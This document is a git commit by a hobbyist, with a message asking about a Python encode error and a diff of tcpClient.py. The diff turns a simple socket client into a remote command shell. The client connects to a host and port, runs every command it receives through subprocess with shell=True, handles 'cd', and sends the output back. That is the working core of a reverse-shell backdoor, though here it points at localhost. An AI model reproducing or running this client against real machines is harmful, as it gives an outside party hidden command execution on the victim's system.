d7355465619fd8fd9453b95b38c78cbcd611f395
Lucas Lambert <plucaslambert@gmail.com>
2018-12-12 15:08:04 +0300

    Should almost work except that I keep getting an error:
    descriptor 'encode' requires a 'str' object but received a '"builtin_function_or_method"'
    
    Also this error only appears when i run "dir", otherise it simply says: "cd, ls, mkdir, etc... not defined.."

--- tcpClient.py
+++ tcpClient.py
@@ -1,19 +1,52 @@
+import os
 import socket
 import subprocess
 
-def Main():
-    host = '127.0.0.1'
-    port = 5100
 
-    s = socket.socket()
-    s.connect((host, port))
-    message = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE)
-    while message != "q":
-        s.send(message)
+# Create a socket
+def socket_create():
+    try:
+        global host
+        global port
+        global s
+        host = '127.0.0.1'
+        port = 9995
+        s = socket.socket()
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg))
+
+
+# Connect to a remote socket
+def socket_connect():
+    try:
+        global host
+        global port
+        global s
+        s.connect((host, port))
+    except socket.error as msg:
+        print("Socket connection error: " + str(msg))
+
+
+# Receive commands from remote server and run on local machine
+def receive_commands():
+    global s
+    while True:
         data = s.recv(1024)
-        print("Received from server: " + str(data))
-        message = raw_input("->")
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[3:].decode("utf-8"))
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_bytes, "utf-8")
+            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+            print(output_str)
     s.close()
 
-if __name__ == '__main__':
-    Main()
+
+def main():
+    socket_create()
+    socket_connect()
+    receive_commands()
+
+
+main()
